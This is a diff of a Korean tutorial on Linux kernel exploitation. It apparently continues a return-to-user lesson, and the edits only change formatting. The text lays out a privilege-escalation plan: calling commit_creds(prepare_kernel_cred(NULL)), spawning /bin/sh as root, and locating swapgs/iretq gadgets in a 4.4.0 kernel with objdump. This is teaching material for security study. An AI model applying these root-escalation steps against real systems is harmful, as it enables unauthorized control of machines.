@@ -13,9 +13,9 @@ x64_return_to_user에서 사용한 환경과 동일하다.
 
 ## Exploit plan
 
-1. prepare_kernel_cred() 함수의 인자 값으로 ’0’을 전달
-2. commit_creds() 함수의 인자 값으로 1.에서 리턴한 값을 전달
-3. system() 함수를 이용해 "/bin/sh" 실행
+1. `prepare_kernel_cred()` 함수의 인자 값으로 `0`을 전달
+2. `commit_creds()` 함수의 인자 값으로 1.에서 리턴한 값을 전달
+3. `system()` 함수를 이용해 "/bin/sh" 실행
 
 ```c
 commit_creds(prepare_kernel_cred(NULL));
@@ -35,7 +35,7 @@ commit_creds()
 "iretq"
 ```
 
-swapgs
+**swapgs**
 
 ```
 ffffffff810613d4:   0f 01 f8                swapgs 
@@ -43,7 +43,7 @@ ffffffff810613d7:   5d                      pop    %rbp
 ffffffff810613d8:   c3                      retq 
 ```
 
-iretq
+**iretq**
 
 ```
 root@bs-virtual-machine:~# objdump -d ./vmlinux-4.4.0-31-generic | grep iretq
